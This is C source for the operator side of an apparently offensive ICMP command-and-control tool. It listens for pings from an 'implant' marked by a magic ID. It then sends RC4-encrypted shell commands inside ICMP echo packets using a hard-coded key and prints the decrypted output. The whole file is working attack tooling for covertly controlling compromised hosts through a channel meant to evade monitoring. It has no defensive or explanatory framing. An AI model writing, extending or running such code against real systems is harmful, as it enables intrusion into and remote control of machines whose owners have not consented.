#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "../include/c2.h"
#include "../include/rc4.h"

#define KEY "thisisapassword"
#define KEY_LENGTH 15

// creates a raw ICMP socket and binds it
int create_socket(char *interface_to_bind) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(1);
    }

    // bind it to the interface if specified
    if (interface_to_bind != NULL) {
        if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, interface_to_bind, strlen(interface_to_bind)) < 0) {
            perror("setsockopt()");
            exit(1);
        }
    }

    return sockfd;
}

// calculate checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

// get the input and return it's buffer
unsigned char *get_command(char *input) {
    unsigned char *cipher_text = (unsigned char *) malloc(BUFFER_SIZE);

    CHECK_ALLOC(cipher_text);

    write(1, "> ", 2);
    fgets(input, BUFFER_SIZE, stdin);

    // encrypt the command
    rc4((unsigned char *) input, strlen(input), (unsigned char *) KEY, KEY_LENGTH, cipher_text);

    return cipher_text;
}

// read from the socket and write the data in a buffer, returns how much have been read
ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
    ssize_t nbytes = read(sockfd, buffer, size);

    if (nbytes < 0) {
        return -1;
    }

    return nbytes;
}

// check if we got an actual connection from our implant
/* TODO: dynamic id */
int check_magic_byte(struct icmphdr *icmp) {
    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
        return 1;
    }
    return 0;
}

// print from where we got our connection
void print_connection_succeed(char *src_ip) {
    printf("[!] Got a connection from %s\n", src_ip);
    puts("[!] Now you should be able to run your commands");
}

// prep'ing the IP headers for later usage
struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip->saddr;

    return addr;
}

// parse the data section
unsigned char *parse_data_section(unsigned char *packet) {
    // get the data section (ignoring the IP & ICMP headers)
    unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

    return data;
}

// prep'ing the ICMP headers & setting up the checksum
void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum) {
    icmp->checksum = 0;
    icmp->checksum = checksum;
    icmp->type = 8;
    icmp->un.echo.id = 9001;
}

// append the command to the data section of the packet
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
    memcpy(data, input, strlen((char *) input));

    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen((char *) input));

    prep_icmp_headers(icmp, checksum);
}

// the actual interaction occurs here
void interact(int sockfd) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    struct sockaddr_in addr; // holds the IP address
    unsigned char *packet; // holds the ICMP packet
    unsigned char *data; // holds the ICMP packet's data section
    unsigned char *cipher_text = malloc(BUFFER_SIZE);
    unsigned char *command;
    char *input; // holds the input buffer
    char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
    ssize_t nbytes;
    size_t data_section_size, packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;
    int connected = 0;

    CHECK_ALLOC(cipher_text);

    input = malloc(BUFFER_SIZE);
    CHECK_ALLOC(input);

    packet = (unsigned char *) malloc(packet_size);
    CHECK_ALLOC(packet);

    puts("[+] Waiting for connections...");

    // wait for pings and if we got one we let the implant know
    while (!connected) {
        if ((read_from_socket(sockfd, packet, packet_size) < 0)) {
            goto out;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            // convert the binary represenation of the IP address to a string
            inet_ntop(AF_INET, &ip->saddr, src_ip, sizeof(src_ip));

            print_connection_succeed(src_ip);

            addr = prep_ip_headers(ip);

            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &addr, sizeof(addr));
            if (nbytes < 0) {
                perror("sendto()");
                goto out;
            }

            connected = 1;
        }
    }

    while (connected) {
        data = parse_data_section(packet);

        addr = prep_ip_headers(ip);

        command = get_command(input);

        append_to_data_section(icmp, data, command);

        // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
        nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
        if (nbytes < 0) {
            perror("sendto()");
            goto out;
        }

        if ((nbytes = read_from_socket(sockfd, packet, packet_size)) < 0) {
            goto out;
        }

        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            data = parse_data_section(packet);

            data_section_size = nbytes - (sizeof(struct iphdr) + sizeof(struct icmphdr));

            // decrypt the cipher text (command's output)
            rc4(data, data_section_size, (unsigned char *) KEY, KEY_LENGTH, cipher_text);

            write(1, cipher_text, data_section_size);
        }
    }

out:
    free(input);
    free(cipher_text);
    free(packet);
}

// initializes the options and starts the c2
void c2_init_n_call(char *interface_to_bind) {
    int sockfd = create_socket(interface_to_bind);

    interact(sockfd);

    close(sockfd);
}
